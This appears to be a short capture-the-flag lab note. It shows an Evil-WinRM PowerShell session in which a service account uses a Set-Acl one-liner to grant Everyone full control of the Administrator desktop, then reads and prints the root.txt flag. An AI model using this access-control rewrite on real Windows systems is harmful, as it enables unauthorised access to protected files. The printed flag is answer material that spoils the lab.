
[[../../../Tools n Info/09 - Windows Exploration/PrivEsc/Privileges/SeBackupPriviledge - File Permission changes|SeBackupPriviledge - File Permission changes]]

this gave us permissions to read the root.txt without privescing

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\desktop> Set-Acl "C:\users\Administrator\desktop" (Get-Acl "C:\users\Administrator\desktop" | %{$_.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","ContainerInherit,ObjectInherit","None","Allow")));$_})

*Evil-WinRM* PS C:\Users\svc-printer\desktop> Get-Acl "C:\users\Administrator\desktop" | fl


Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\Administrator\desktop
Owner  : BUILTIN\Administrators
Group  : RETURN\Domain Users
Access : Everyone Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         RETURN\Administrator Allow  FullControl
Audit  :
Sddl   : O:BAG:DUD:AI(A;OICI;FA;;;WD)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA)
```

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\desktop> cd "C:\users\Administrator\desktop"
*Evil-WinRM* PS C:\users\Administrator\desktop> ls


    Directory: C:\users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/29/2025   8:05 AM             34 root.txt


*Evil-WinRM* PS C:\users\Administrator\desktop> type root.txt
69f76b32a91c06174a9b82427697908a
```

